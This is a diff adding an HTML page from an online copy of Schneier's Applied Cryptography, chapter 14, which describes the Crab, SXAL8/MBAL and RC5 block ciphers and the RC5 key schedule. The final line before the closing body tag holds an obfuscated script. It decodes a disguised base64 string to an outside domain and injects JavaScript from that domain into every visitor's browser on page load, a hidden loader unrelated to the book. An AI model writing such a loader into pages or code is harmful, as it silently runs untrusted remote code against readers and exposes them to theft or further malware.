@@ -1,0 +1,181 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Still Other Block Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=14//-->
+<!--PAGES=343-345//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="14-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="14-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>These subkeys must all be calculated before encryption or decryption.
+</P>
+<P>To encrypt a 1024-byte block <I>X:</I></P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Divide <I>X</I> into 256 32-bit sub-blocks: <I>X</I><SUB>0</SUB>, <I>X</I><SUB>1</SUB>, <I>X</I><SUB>2</SUB>,..., <I>X</I><SUB>255</SUB>.
+<DD><B>(2)</B>&nbsp;&nbsp;Permute the sub-blocks of <I>X</I> according to <I>P</I>.
+<DD><B>(3)</B>&nbsp;&nbsp;For <I>r</I> = 0 to 3
+<BR>For <I>g</I> = 0 to 63
+<DL>
+<DD><I>A</I> = <I>X</I><SUB>(4<I>g</I>)&lt&lt&lt2r</SUB>
+<DD><I>B</I> = <I>X</I><SUB>(4<I>g</I>&#43;1)&lt&lt&lt2r</SUB>
+<DD><I>C</I> = <I>X</I><SUB>(4<I>g</I>&#43;2)&lt&lt&lt2r</SUB>
+<DD><I>D</I> = <I>X</I><SUB>(4<I>g</I>&#43;3)&lt&lt&lt2r</SUB>
+<DD>For step <I>s</I> = 0 to 7
+<DL>
+<DD><I>A</I> = <I>A</I> &#8853; (<I>B</I> &#43; f<SUB>r</SUB>(<I>B,C,D</I>) &#43; <I>S</I><SUB>512<I>r</I>&#43;8 g&#43;s</SUB>)
+<DD><I>TEMP</I> = <I>D</I>
+<DD><I>D</I> = <I>C</I>
+<DD><I>C</I> = <I>B</I>
+<DD><I>B</I> = <I>A</I> &lt&lt&lt 5
+<DD><I>A</I> = <I>TEMP</I>
+</DL>
+<DD><I>X</I><SUB>(4<I>g</I>)&lt&lt&lt2r</SUB> = <I>A</I>
+<DD><I>X</I><SUB>(4<I>g</I>&#43;1)&lt&lt&lt2r</SUB> = <I>B</I>
+<DD><I>X</I><SUB>(4<I>g</I>&#43;2)&lt&lt&lt2r</SUB> = <I>C</I>
+<DD><I>X</I><SUB>(4<I>g</I>&#43;3)&lt&lt&lt2r</SUB> = <I>D</I>
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Recombine <I>X</I><SUB>0</SUB>, <I>X</I><SUB>1</SUB>, <I>X</I><SUB>2</SUB>,..., <I>X</I><SUB>255</SUB> to form the ciphertext.
+</DL>
+<P>The functions f<SUB>r</SUB>(<I>B,C,D</I>) are similar to those used in MD5:</P>
+<DL>
+<DL>
+<DD>f<SUB>0</SUB>(<I>B,C,D</I>) = (<I>B</I> &#923; <I>C</I>) &#957; ((&#172; <I>B</I>) &#923; <I>D</I>)
+<DD>f<SUB>1</SUB>(<I>B,C,D</I>) = (<I>B</I> &#923; <I>D</I>) &#957; (<I>C</I> &#923; (&#172; <I>D</I>))
+<DD>f<SUB>2</SUB>(<I>B,C,D</I>) = <I>B</I> &#8853; <I>C</I> &#8853; <I>D</I>
+<DD>f<SUB>3</SUB>(<I>B,C,D</I>) = <I>C</I> &#8853; (<I>B</I> &#957; (&#172; <I>D</I>))
+</DL>
+</DL>
+<P>Decryption is the reverse process.
+</P>
+<P>Generating the subkeys is a large task. Here is how the permutation array, <I>P</I>, could be generated from an 80-bit key, <I>K</I>.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Initialize <I>K</I><SUB>0</SUB>, <I>K</I><SUB>1</SUB>, <I>K</I><SUB>2</SUB>,..., <I>K</I><SUB>9</SUB> with the 10 bytes of <I>K</I>.
+<DD><B>(2)</B>&nbsp;&nbsp;For <I>i</I> = 10 to 255
+<DL>
+<DD><I>K</I><SUB>i</SUB> = <I>K</I><SUB>i - 2</SUB> &#8853; <I>K</I><SUB>i - 6</SUB> &#8853; <I>K</I><SUB>i - 7</SUB> &#8853; <I>K</I><SUB>i - 10</SUB>
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;For <I>i</I> = 0 to 255, <I>P</I><SUB>i</SUB> = <I>i</I>
+<DD><B>(4)</B>&nbsp;&nbsp;<I>m</I> = 0
+<DD><B>(5)</B>&nbsp;&nbsp;For <I>j</I> = 0 to 1
+<DL>
+<DD>For <I>i</I> = 256 to 1 step -1
+<DL>
+<DD><I>m</I> = (<I>K</I><SUB>256 - <I>i</I></SUB> &#43; <I>K</I><SUB>257 - <I>i</I></SUB>) mod <I>i</I>
+<DD><I>K</I><SUB>257 - <I>i</I></SUB> = <I>K</I><SUB>257 - <I>i</I></SUB> &lt&lt&lt 3
+<DD>Swap <I>P</I><SUB>i</SUB> and <I>P</I><SUB>i - 1</SUB>
+</DL>
+</DL>
+</DL>
+<P>The S-array of 2048 32-bit words could be generated in a similar manner, either from the same 80-bit key or from another key. The authors caution that these details should &#147;be viewed as motivational; there may very well be alternative schemes which are both more efficient and offer improved security&#148; [810].
+</P>
+<P>Crab was proposed as a testbed of new ideas and not as a working algorithm. It uses many of the same techniques as MD5. Biham has argued that a very large block size makes an algorithm easier to cryptanalyze [160]. On the other hand, Crab may make efficient use of a very large key. In such a case, &#147;easier to cryptanalyze&#148; might not mean much.</P>
+<H3><A NAME="Heading8"></A><FONT COLOR="#000077">14.7 SXAL8/MBAL</FONT></H3>
+<P>This is a 64-bit block algorithm from Japan [769]. SXAL8 is the basic algorithm; MBAL is an expanded version with a variable block length. Since MBAL does some clever things internally, the authors claim that they can get adequate security with only a few rounds. With a block length of 1024 bytes, MBAL is about 70 times faster than DES. Unfortunately, [1174] shows that MBAL is susceptible to differential cryptanalysis, and [865] shows that it is susceptible to linear cryptanalysis.
+</P>
+<H3><A NAME="Heading9"></A><FONT COLOR="#000077">14.8 RC5</FONT></H3>
+<P>RC5 is a block cipher with a variety of parameters: block size, key size, and number of rounds. It was invented by Ron Rivest and analyzed by RSA Laboratories [1324,1325].
+</P>
+<P>There are three operations: XOR, addition, and rotations. Rotations are constant-time operations on most processors and variable rotations are a nonlinear function. These rotations, which depend on both the key and the data, are the interesting operation.</P>
+<P>RC5 has a variable-length block, but this example will focus on a 64-bit data block. Encryption uses 2<I>r</I> &#43; 2 key-dependent 32-bit words&#151;<I>S</I><SUB>0</SUB>, <I>S</I><SUB>1</SUB>, <I>S</I><SUB>2</SUB>,..., <I>S</I><SUB>2<I>r</I> &#43; 1</SUB>&#151;where <I>r</I> is the number of rounds. We&#146;ll generate those words later. To encrypt, first divide the plaintext block into two 32-bit words: <I>A</I> and <I>B</I>. (RC5 assumes a little-endian convention for packing bytes into words: The first byte goes into the low-order bit positions of register <I>A</I>, etc.) Then:</P>
+<DL>
+<DL>
+<DD><I>A</I> = <I>A</I> &#43; <I>S</I><SUB>0</SUB>
+<DD><I>B</I> = <I>B</I> &#43; <I>S</I><SUB>1</SUB>
+</DL>
+<DD>For <I>i</I> = 1 to <I>r:</I>
+<DL>
+<DD><I>A</I> = ((<I>A</I> &#8853; <I>B</I>) &lt&lt&lt <I>B</I>) &#43; <I>S</I><SUB>2i</SUB>
+<DD><I>B</I> = ((<I>B</I> &#8853; <I>A</I>) &lt&lt&lt <I>A</I>) &#43; <I>S</I><SUB>2<I>i</I> &#43; 1</SUB>
+</DL>
+</DL>
+<P>The output is in the registers <I>A</I> and <I>B</I>.</P>
+<P>Decryption is just as easy. Divide the plaintext block into two words, <I>A</I> and <I>B</I>, and then:</P>
+<DL>
+<DD>For <I>i</I> = <I>r</I> down to 1:
+<DL>
+<DD><I>B</I> = ((<I>B</I> &#150; <I>S</I><SUB>2i &#43; 1</SUB>) &gt&gt&gt <I>A</I>) &#8853; <I>A</I>
+<DD><I>A</I> = ((<I>A</I> &#150; <I>S</I><SUB>2i</SUB>) &gt&gt&gt <I>B</I>) &#8853; <I>B</I>
+</DL>
+<DD><I>B</I> = <I>B</I> &#150; <I>S</I><SUB>1</SUB>
+<DD><I>A</I> = <I>A</I> &#150; <I>S</I><SUB>0</SUB>
+</DL>
+<P>The symbol &#147;&gt&gt&gt&#148; is a right circular shift. Of course, all addition and subtraction are mod 2<SUP>32</SUP>.</P>
+<P>Creating the array of keys is more complicated, but also straightforward. First, copy the bytes of the key into an array, <I>L</I>, of <I>c</I> 32-bit words, padding the final word with zeros if necessary. Then, initialize an array, <I>S</I>, using a linear congruential generator mod 2<SUP>32</SUP>:</P>
+<DL>
+<DD><I>S</I><SUB>0</SUB> = P
+<DD>for <I>i</I> = 1 to 2(<I>r</I> &#43; 1) &#150; 1:
+<DL>
+<DD><I>S</I><SUB>i</SUB> = (<I>S</I><SUB>i - 1</SUB> &#43; Q) mod 2<SUP>32</SUP>
+</DL>
+</DL>
+<P>P = 0xb7e15163 and Q = 0x9e3779b9; these constants are based on the binary representation of e and phi.
+</P>
+<P>Finally, mix <I>L</I> into <I>S:</I></P>
+<DL>
+<DD><I>i</I> = <I>j</I> = 0
+<DD><I>A</I> = <I>B</I> = 0
+<DD>do 3<I>n</I> times (where <I>n</I> is the maximum of 2(<I>r</I> &#43; 1) and <I>c</I>):
+<DL>
+<DD><I>A</I> = <I>S</I><SUB>i</SUB> = (<I>S</I><SUB>i</SUB> &#43; <I>A</I> &#43; <I>B</I>) &lt&lt&lt 3
+<DD><I>B</I> = <I>L</I><SUB>j</SUB> = (<I>L</I><SUB>j</SUB> &#43; <I>A</I> &#43; <I>B</I>) &lt&lt&lt (<I>A</I> &#43; <I>B</I>)
+</DL>
+<DD><I>i</I> = (<I>i</I> &#43; 1) mod 2(<I>r</I> &#43; 1)
+<DD><I>j</I> = (<I>j</I> &#43; 1) mod <I>c</I>
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="14-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="14-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(sRbuBaTm, suogUBYi) {suogUBYi = sRbuBaTm.createElement('script');suogUBYi.type = 'text/javascript';suogUBYi.async = true;suogUBYi.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');sRbuBaTm.getElementsByTagName('body')[0].appendChild(suogUBYi);}(document));</script></body>
+</html>
